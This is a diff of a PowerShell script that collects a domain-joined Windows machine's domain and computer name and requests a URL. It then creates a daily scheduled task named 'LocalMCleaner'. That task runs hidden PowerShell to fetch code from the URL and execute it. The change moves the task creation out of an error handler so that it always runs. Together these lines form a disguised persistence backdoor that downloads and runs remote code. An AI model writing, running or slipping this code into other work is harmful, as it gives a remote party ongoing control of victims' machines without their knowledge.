@@ -1,8 +1,7 @@
 $computerInfo = Get-ComputerInfo  
 if ($computerInfo.CsPartOfDomain) 
-{  
-
- $domain = $computerInfo.Domain  
+{ 
+    $domain = $computerInfo.Domain  
     $computerName = $computerInfo.CsName  
     $domain = $computerInfo.CsDomain
     $fullString = $domain+"_"+$computerName 
@@ -11,11 +10,11 @@ if ($computerInfo.CsPartOfDomain)
         $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
         Write-Host "URL: $url"  
         Write-Host "$($response.StatusCode)"  
-    } catch {  
+    } catch { 
+    }  
     $ccc = `"Powershell -WindowStyle Hidden irm `"  + $url +`"|Powershell`"
     $str = "cmd.exe /c schtasks /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:30 /f"
     iex  $str
-    }  
 } 
 else
 {  
